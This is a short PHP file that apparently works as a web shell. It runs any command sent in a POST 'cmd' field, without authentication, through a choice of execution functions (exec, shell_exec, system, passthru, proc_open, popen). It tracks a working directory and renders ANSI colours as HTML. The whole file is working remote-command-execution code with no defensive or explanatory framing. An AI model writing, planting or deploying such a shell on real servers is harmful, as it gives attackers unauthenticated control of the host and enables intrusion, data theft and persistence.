<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['cmd']) && isset($_POST['mode'])) {
        echo "<pre>";
        $cmd = ($_POST['cmd']);
        $mode = ($_POST['mode']);
        if (substr($cmd, 0, 2) === 'cd') {
            $_SESSION['dir'] = substr($cmd, 3);
        } else {
            if (isset($_SESSION['dir'])) {
                $cmd = 'cd ' . $_SESSION['dir'] . ' && ' . $cmd;
            }
            $output = executeCommand($mode, $cmd);
            $output = escapeAsciiColors($output);
            echo $output;
            echo "</pre>";
            exit;
        }
    }
}
function executeCommand($type, $command)
{
    switch ($type) {
        case 'exec':
            exec($command, $output, $return_var);
            return implode("\n", $output);
        case 'shell_exec':
            return shell_exec($command);
        case 'system':
            ob_start();
            system($command, $return_var);
            return ob_get_clean();
        case 'passthru':
            ob_start();
            passthru($command, $return_var);
            return ob_get_clean();
        case 'proc_open':
            $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("file", "/tmp/error-output.txt", "a"));
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                $return_value = proc_close($process);
                return $output;
            }
            return false;
        case 'popen':
            $handle = popen($command, 'r');
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            return $output;
        default:
            return false;
    }
}
function escapeAsciiColors($output)
{
    $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
    $output = preg_replace_callback('#\\033\[(.*?)m#', function ($matches) {
        $styles = explode(';', $matches[1]);
        $stylesHtml = array('0' => 'font-weight:normal;color:#FFF;background:transparent;', '1' => 'font-weight:bold;', '30' => 'color:#000;', '31' => 'color:#F00;', '32' => 'color:#0F0;', '33' => 'color:#FF0;', '34' => 'color:#00F;', '35' => 'color:#F0F;', '36' => 'color:#0FF;', '37' => 'color:#FFF;', '40' => 'background:#000;', '41' => 'background:#F00;', '42' => 'background:#0F0;', '43' => 'background:#FF0;', '44' => 'background:#00F;', '45' => 'background:#F0F;', '46' => 'background:#0FF;', '47' => 'background:#FFF;',);
        $style = '';
        foreach ($styles as $s) {
            if (isset($stylesHtml[$s])) {
                $style .= $stylesHtml[$s];
            }
        }
        return $style ? '<span style="' . $style . '">' : '';
    }, $output);
    return $output;
}
